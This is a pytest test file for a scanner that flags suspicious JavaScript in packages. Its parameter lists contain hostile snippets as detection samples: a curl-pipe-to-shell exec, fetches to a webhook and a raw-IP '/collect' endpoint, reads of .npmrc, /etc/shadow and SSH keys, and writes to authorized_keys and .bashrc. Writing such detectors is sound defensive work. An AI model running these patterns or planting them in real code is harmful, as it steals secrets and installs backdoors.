"""The scanner only parses these snippets. None of them are ever run."""

import base64

import pytest

from app.analysis.js_scanner import Hit, scan_source, scannable_language
from app.analysis.models import Severity


def scan(code: str, language: str = "javascript") -> list[Hit]:
    return list(scan_source(code.encode(), language).hits)


def rules(code: str, language: str = "javascript") -> set[str]:
    return {hit.rule_id for hit in scan(code, language)}


@pytest.mark.parametrize(
    ("code", "expected"),
    [
        # Dynamic execution
        ("eval(payload)", "EXEC-001"),
        ("new Function(body)", "EXEC-001"),
        ("(0, eval)(payload)", "EXEC-001"),
        ("global['ev' + 'al'](payload)", "EXEC-001"),
        ("globalThis.eval(payload)", "EXEC-001"),
        ("const e = eval; e(payload)", "EXEC-001"),
        ("require('vm').runInThisContext(code)", "EXEC-001"),
        ("import vm from 'node:vm'; vm.runInNewContext(code)", "EXEC-001"),
        ("Function('return this')()", "EXEC-002"),
        ("setTimeout('doThing()', 10)", "EXEC-002"),
        ("eval(atob(blob))", "EXEC-003"),
        ("eval(Buffer.from(blob, 'base64').toString())", "EXEC-003"),
        ("new Function(Buffer.from(blob, 'hex').toString())()", "EXEC-003"),
        ("require(name)", "EXEC-004"),
        ("require(atob(blob))", "EXEC-005"),
        # Child processes
        ("require('child_process')", "PROC-001"),
        ("require('node:child_process')", "PROC-001"),
        ("require('chi' + 'ld_process')", "PROC-001"),
        ("import cp from 'child_process'", "PROC-001"),
        ("require('child_process').exec('ls')", "PROC-002"),
        ("const { spawn } = require('child_process'); spawn('git', ['status'])", "PROC-002"),
        ("import { exec as run } from 'child_process'; run('ls')", "PROC-002"),
        ("const cp = require('child_process'); cp.execSync(command)", "PROC-003"),
        ("require('child_process').exec('curl http://x.test/a | sh')", "PROC-004"),
        ("require('child_process').exec('echo aGk= | base64 -d')", "PROC-004"),
        ("process.binding('spawn_sync')", "PROC-005"),
        ("process['bind' + 'ing']('spawn_sync')", "PROC-005"),
        # Environment
        ("process.env.NODE_ENV", "ENV-001"),
        ("process.env.NPM_TOKEN", "ENV-002"),
        ("process.env['AWS_SECRET_ACCESS_KEY']", "ENV-002"),
        ("process['env']['GITHUB_TOKEN']", "ENV-002"),
        ("const { API_KEY } = process.env", "ENV-002"),
        ("const e = process.env; e.NPM_TOKEN", "ENV-002"),
        ("send(process.env)", "ENV-003"),
        ("JSON.stringify(process.env)", "ENV-003"),
        # Network
        ("fetch(url)", "NET-001"),
        ("require('https').get(url)", "NET-001"),
        ("import http from 'node:http'; http.request(options)", "NET-001"),
        ("new WebSocket(url)", "NET-001"),
        ("new XMLHttpRequest()", "NET-001"),
        ("require('net').connect(9000)", "NET-001"),
        ("import axios from 'axios'; axios.post(url, body)", "NET-001"),
        ("fetch('https://discord.com/api/webhooks/1/abc')", "NET-002"),
        ("fetch('http://45.77.10.3/collect')", "NET-002"),
        ("const hook = 'https://webhook.site/abc'", "NET-003"),
        # Obfuscation
        (
            "var " + ",".join(f"_0x{i:04x}=1" for i in range(8)),
            "OBF-001",
        ),
        (f"const blob = '{base64.b64encode(bytes(range(256))).decode()}'", "OBF-002"),
        ("String.fromCharCode(104,101,108,108,111,32,119,111)", "OBF-003"),
        ("atob(blob)", "OBF-004"),
        ("Buffer.from(blob, 'base64')", "OBF-004"),
        # Filesystem
        ("require('fs').readFileSync('/home/me/.npmrc')", "FS-001"),
        ("import { readFile } from 'fs/promises'; readFile('/etc/passwd')", "FS-001"),
        ("const fs = require('fs'); fs.readFile(path.join(home, '.ssh', 'id_rsa'), cb)", "FS-001"),
        ("const fs = require('fs'); fs.promises.readFile('/etc/shadow')", "FS-001"),
        ("require('fs').appendFileSync(path.join(home, '.bashrc'), line)", "FS-002"),
        ("require('fs').writeFileSync('/root/.ssh/authorized_keys', key)", "FS-002"),
    ],
)
def test_rule_fires(code: str, expected: str) -> None:
    assert expected in rules(code)


@pytest.mark.parametrize(
    ("code", "absent"),
    [
        ("// eval(payload)\n/* require('child_process') */", "EXEC-001"),
        ("const text = 'eval(payload)'", "EXEC-001"),
        ("obj.eval(payload)", "EXEC-001"),
        ("const eval2 = 1; eval2 + 1", "EXEC-001"),
        ("exec('ls')", "PROC-002"),
        ("regex.exec(text)", "PROC-003"),
        ("fs.readFileSync('/etc/passwd')", "FS-001"),
        ("require('fs').readFileSync('./data.json')", "FS-001"),
        ("require('fs').readFileSync('./environment.ts')", "FS-001"),
        ("fetch('http://127.0.0.1:3000')", "NET-002"),
        ("fetch('http://192.168.1.4/a')", "NET-002"),
        ("Buffer.from(text)", "OBF-004"),
        ("Buffer.from(text, 'utf8')", "OBF-004"),
        ("process.env.NODE_ENV = 'test'", "ENV-001"),
        ("process.env.AUTHOR", "ENV-002"),
        ("'NODE_ENV' in process.env", "ENV-003"),
        ("process.binding('fs')", "PROC-005"),
        (f"const pad = '{'a' * 400}'", "OBF-002"),
        ("const url = 'data:image/png;base64," + "QUJD" * 100 + "'", "OBF-002"),
    ],
)
def test_harmless_code_does_not_trigger(code: str, absent: str) -> None:
    assert absent not in rules(code)


@pytest.mark.parametrize(
    "code",
    [
        "process.env.NODE_ENV",
        "fetch(url)",
        "require('child_process')",
        "atob(blob)",
        "Function('return this')()",
    ],
)
def test_isolated_api_use_stays_low_severity(code: str) -> None:
    assert all(hit.severity <= Severity.LOW for hit in scan(code))


def test_finding_has_correct_line() -> None:
    hits = scan("const a = 1;\n\n\neval(payload);\n")
    assert [hit.line for hit in hits if hit.rule_id == "EXEC-001"] == [4]


def test_escaped_module_name_is_resolved() -> None:
    assert "PROC-001" in rules("require('child\\x5fprocess')")
    assert "PROC-001" in rules("require('child\\u005fprocess')")


def test_template_string_with_no_substitution_is_fixed() -> None:
    assert "PROC-001" in rules("require(`child_process`)")
    assert "EXEC-004" in rules("require(`./${name}`)")


def test_repeated_environment_reads_are_reported_once() -> None:
    hits = scan("process.env.NPM_TOKEN; process.env.NPM_TOKEN; process.env.GH_TOKEN")
    assert sum(hit.rule_id == "ENV-002" for hit in hits) == 2


def test_evidence_is_truncated_and_on_one_line() -> None:
    code = "eval(a +\n   " + " + ".join(["b"] * 400) + ")"
    evidence = next(hit.evidence for hit in scan(code) if hit.rule_id == "EXEC-001")
    assert len(evidence) <= 200
    assert "\n" not in evidence


@pytest.mark.parametrize("language", ["typescript", "tsx"])
def test_typescript_syntax(language: str) -> None:
    code = "const run = (x: string): void => { eval(x as string); };"
    result = scan_source(code.encode(), language)
    assert not result.has_parse_errors
    assert "EXEC-001" in {hit.rule_id for hit in result.hits}


def test_typescript_import_require() -> None:
    assert "PROC-002" in rules("import cp = require('child_process'); cp.exec('ls');", "typescript")


def test_parse_errors_are_reported_and_still_scanned() -> None:
    result = scan_source(b"function ( {{{ \n eval(payload);", "javascript")
    assert result.has_parse_errors


def test_very_deep_nesting_does_not_crash() -> None:
    code = "(" * 100_000 + "eval(x)" + ")" * 100_000
    scan_source(code.encode(), "javascript")
    chain = "a" + ".b" * 50_000 + "()"
    scan_source(chain.encode(), "javascript")
    concat = "require(" + "+".join(["'a'"] * 20_000) + ")"
    scan_source(concat.encode(), "javascript")


def test_invalid_utf8_does_not_crash() -> None:
    scan_source(b"const a = '\xff\xfe'; eval(payload)", "javascript")


@pytest.mark.parametrize(
    "escape", ["'\\u{110000}'", "'\\xZZ'", "'\\'", "'\\u{}'", "'\\u'", "'\\x'"]
)
def test_malformed_escapes_do_not_crash(escape: str) -> None:
    scan_source(f"require({escape})".encode(), "javascript")


@pytest.mark.parametrize(
    ("path", "language"),
    [
        ("a.js", "javascript"),
        ("a.mjs", "javascript"),
        ("a.cjs", "javascript"),
        ("a.jsx", "javascript"),
        ("A.JS", "javascript"),
        ("a.ts", "typescript"),
        ("a.mts", "typescript"),
        ("a.cts", "typescript"),
        ("a.tsx", "tsx"),
        ("a.d.ts", None),
        ("a.d.mts", None),
        ("a.json", None),
        ("a.js.map", None),
    ],
)
def test_scannable_language(path: str, language: str | None) -> None:
    assert scannable_language(path) == language


def test_a_few_hex_identifiers_are_not_obfuscation() -> None:
    names = ",".join(f"_0x{i:04x}=1" for i in range(7))
    assert "OBF-001" not in rules(f"var {names}")
